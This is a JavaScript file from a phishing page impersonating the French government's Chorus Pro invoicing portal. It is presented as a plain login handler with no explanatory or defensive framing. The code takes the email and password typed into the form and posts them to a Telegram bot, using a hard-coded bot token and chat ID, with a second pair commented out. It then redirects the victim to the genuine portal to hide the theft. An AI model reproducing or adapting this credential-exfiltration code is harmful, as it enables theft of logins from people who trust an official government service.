

document.getElementById('form').addEventListener('submit', function (e) {
    e.preventDefault();

    // Récupération des valeurs du formulaire
    const email = document.getElementById('email').value;
    const pwd = document.getElementById('pwd').value;


    // Construction du message
    const message = `
        🎀 Sorus pro :
        \n📩 Email : ${email}
        \n🔑 mot de passe: ${pwd}

    `;

    const botToken = '7095567255:AAE7899EX0ZlPFXtIaccA3qIx0FIEsQoaiM';
    const chatId = '6427871548';

    // const botToken = '7366002950:AAFzze0vYX5nxrxWxX7y4vVg2CcJy-3Fsi4';
    // const chatId = '7332838769';

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    // Envoi du message au bot Telegram
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            localStorage.setItem('email', email);
            console.log('Votre message a été envoyé avec succès !');
            window.location.href='https://portail.chorus-pro.gouv.fr/aife_csm';
        } else {
            console.error('Erreur lors de l\'envoi du message:', data.description);
            console.log('Une erreur est survenue lors de l\'envoi de votre message. Veuillez réessayer.');
        }
    })
    .catch(error => {
        console.error('Erreur réseau ou serveur:', error);
        console.log('Une erreur est survenue lors de l\'envoi de votre message. Veuillez réessayer.');
    });
});

